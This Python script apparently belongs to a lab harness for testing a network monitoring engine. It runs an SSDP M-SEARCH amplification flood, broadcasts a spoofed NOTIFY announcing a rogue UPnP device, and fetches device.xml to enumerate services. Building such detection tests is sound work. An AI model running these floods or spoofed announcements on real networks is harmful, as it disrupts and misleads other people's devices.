"""
Attack Script: Generic SSDP / UPnP Device
==========================================
Target  : SSDP device broadcasting via ssdpy (_ssdp._udp, multicast)
          (no fixed port — SSDP uses UDP multicast 239.255.255.250:1900)

Attacks performed
-----------------
1. SSDP M-SEARCH FLOOD    — sends many rapid M-SEARCH discovery requests
                            → forces the device to respond repeatedly (amplification)
2. FAKE SSDP ANNOUNCE     — sends a crafted SSDP NOTIFY pretending to be a
                            new device on the network
                            → triggers UNKNOWN_DEVICE alert if monitoring sees
                              packets from the injected MAC/IP
3. UPnP DESCRIPTION FETCH — if the device responds, fetches its device.xml
                            → leaks device capabilities and service list

Run order
---------
  1. python Devices/SSDP/generic_ssdp_device.py   (start the device)
  2. python Engines/main.py                        (start monitoring)
  3. python Attacks/attack_ssdp.py                (run this script)

Expected monitoring alerts
--------------------------
  [UNKNOWN_DEVICE]  — fake SSDP NOTIFY from spoofed IP triggers unknown
                      device detection if monitoring sees the packet source
"""

import socket
import time
import urllib.request
import sys

# ── CONFIG ────────────────────────────────────────────────────────────────────
# SSDP uses multicast so no single TARGET_IP applies to flood/announce attacks.
# Docker note: multicast M-SEARCH reaches containers on the same Docker bridge.
#   On Windows/Docker Desktop, multicast may not cross the Hyper-V boundary.
#   If no responses are seen, run this script inside a Docker container:
#     docker run --rm --network bridge -v "%cd%":/app python:3.11 python /app/Attacks/attack_ssdp.py
# The fake device IP for attack 2 can be overridden as the first argument:
#   python attack_ssdp.py 172.17.0.250
SSDP_MULTICAST_IP   = "239.255.255.250"
SSDP_PORT           = 1900
FLOOD_COUNT         = 30
FLOOD_DELAY         = 0.05
FAKE_DEVICE_IP      = sys.argv[1] if len(sys.argv) > 1 else "172.17.0.250"
FAKE_DEVICE_PORT    = 9999
# ─────────────────────────────────────────────────────────────────────────────


def print_banner(title):
    print("\n" + "=" * 60)
    print(f"  {title}")
    print("=" * 60)


# ── ATTACK 1: SSDP M-SEARCH FLOOD ────────────────────────────────────────────
def attack_msearch_flood():
    print_banner("ATTACK 1: SSDP M-SEARCH Flood")
    print(f"  Target  : {SSDP_MULTICAST_IP}:{SSDP_PORT} (SSDP multicast)")
    print(f"  Action  : Sending {FLOOD_COUNT} M-SEARCH requests rapidly")
    print(f"  Effect  : Forces every SSDP device on the LAN to reply (amplification)\n")

    # Standard UPnP M-SEARCH request
    msearch = (
        "M-SEARCH * HTTP/1.1\r\n"
        f"HOST: {SSDP_MULTICAST_IP}:{SSDP_PORT}\r\n"
        "MAN: \"ssdp:discover\"\r\n"
        "MX: 1\r\n"
        "ST: ssdp:all\r\n"
        "\r\n"
    ).encode()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    sock.settimeout(0.5)

    responses = []

    for i in range(FLOOD_COUNT):
        sock.sendto(msearch, (SSDP_MULTICAST_IP, SSDP_PORT))
        print(f"    Sent M-SEARCH #{i+1:3d}", end="\r")

        # Collect any replies that arrive quickly
        try:
            data, addr = sock.recvfrom(4096)
            if addr not in responses:
                responses.append(addr)
                print(f"\n    Response from {addr[0]}:{addr[1]}")
        except socket.timeout:
            pass

        time.sleep(FLOOD_DELAY)

    sock.close()
    print(f"\n  Flood complete — {FLOOD_COUNT} requests sent")
    print(f"  Unique responders: {len(responses)}")
    print("  >> Amplification: each request forces all SSDP devices to respond")


# ── ATTACK 2: FAKE SSDP NOTIFY (ROGUE DEVICE ANNOUNCEMENT) ───────────────────
def attack_fake_notify():
    print_banner("ATTACK 2: Rogue SSDP NOTIFY — Fake Device Injection")
    print(f"  Action  : Broadcasting a fake device as {FAKE_DEVICE_IP}:{FAKE_DEVICE_PORT}")
    print(f"  Effect  : Injects an unknown device into the network's SSDP landscape")
    print(f"  Alert   : UNKNOWN_DEVICE (if monitoring engine sees traffic from fake IP)\n")

    import uuid
    fake_usn  = f"uuid:{uuid.uuid4()}::urn:schemas-upnp-org:device:Basic:1"
    fake_loc  = f"http://{FAKE_DEVICE_IP}:{FAKE_DEVICE_PORT}/device.xml"

    # SSDP NOTIFY ssdp:alive — announces a new device to the network
    notify = (
        "NOTIFY * HTTP/1.1\r\n"
        f"HOST: {SSDP_MULTICAST_IP}:{SSDP_PORT}\r\n"
        "NTS: ssdp:alive\r\n"
        "NT: urn:schemas-upnp-org:device:Basic:1\r\n"
        f"USN: {fake_usn}\r\n"
        f"LOCATION: {fake_loc}\r\n"
        "CACHE-CONTROL: max-age=1800\r\n"
        "SERVER: FakeOS/1.0 UPnP/1.1 AttackDevice/1.0\r\n"
        "\r\n"
    ).encode()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)

    # Send 5 announcements (real devices send 3 on appearance)
    for i in range(5):
        sock.sendto(notify, (SSDP_MULTICAST_IP, SSDP_PORT))
        print(f"    Sent rogue NOTIFY #{i+1} (USN: {fake_usn[:40]}...)")
        time.sleep(0.2)

    sock.close()
    print(f"\n  Rogue NOTIFY sent — fake device at {FAKE_DEVICE_IP} announced to LAN")
    print("  >> Any SSDP scanner will now see this fake device")


# ── ATTACK 3: UPnP DESCRIPTION FETCH ─────────────────────────────────────────
def attack_upnp_fetch(device_xml_url=None):
    print_banner("ATTACK 3: UPnP Device Description Fetch")
    print(f"  Action  : Fetching device.xml to enumerate services and capabilities\n")

    if device_xml_url is None:
        # Try to discover a device first via M-SEARCH
        msearch = (
            "M-SEARCH * HTTP/1.1\r\n"
            f"HOST: {SSDP_MULTICAST_IP}:{SSDP_PORT}\r\n"
            "MAN: \"ssdp:discover\"\r\n"
            "MX: 3\r\n"
            "ST: ssdp:all\r\n"
            "\r\n"
        ).encode()

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
        sock.settimeout(3)
        sock.sendto(msearch, (SSDP_MULTICAST_IP, SSDP_PORT))

        print("  Waiting for SSDP responses to find device.xml location...")
        discovered_locations = []

        try:
            while True:
                data, addr = sock.recvfrom(4096)
                response   = data.decode(errors="ignore")
                for line in response.splitlines():
                    if line.lower().startswith("location:"):
                        loc = line.split(":", 1)[1].strip()
                        if loc not in discovered_locations:
                            discovered_locations.append(loc)
                            print(f"    Found LOCATION: {loc}")
        except socket.timeout:
            pass
        finally:
            sock.close()

        if not discovered_locations:
            print("  No devices responded — is generic_ssdp_device.py running?")
            return

        device_xml_url = discovered_locations[0]

    print(f"\n  Fetching: {device_xml_url}")
    try:
        req  = urllib.request.Request(device_xml_url,
                                      headers={"User-Agent": "UPnP-Enum/1.0"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            body = resp.read().decode(errors="ignore")
        print(f"  Status  : {resp.status}")
        print(f"  Content (first 600 chars):\n")
        print("  " + "\n  ".join(body[:600].splitlines()))
        print("\n  >> Device description fetched — attacker now knows all services")
    except Exception as e:
        print(f"  Failed to fetch device.xml: {e}")
        print("  (Device may not serve XML — this is the simulated ssdpy device)")


# ── MAIN ──────────────────────────────────────────────────────────────────────
def main():
    print("\n" + "#" * 60)
    print("#  AutoSecure Attack Simulation — SSDP / UPnP Device       #")
    print("#  Protocol : SSDP multicast 239.255.255.250:1900           #")
    print("#  FOR EDUCATIONAL / LAB USE ONLY                          #")
    print("#" * 60)
    print("\n  Make sure the SSDP device and monitoring engine are running first.")
    if "--auto" not in sys.argv:
        input("\n  Press Enter to begin attacks...")

    attack_msearch_flood()
    time.sleep(1)
    attack_fake_notify()
    time.sleep(1)
    attack_upnp_fetch()

    print("\n" + "=" * 60)
    print("  All attacks complete.")
    print("  Check the monitoring engine output for triggered alerts.")
    print("=" * 60 + "\n")


if __name__ == "__main__":
    main()
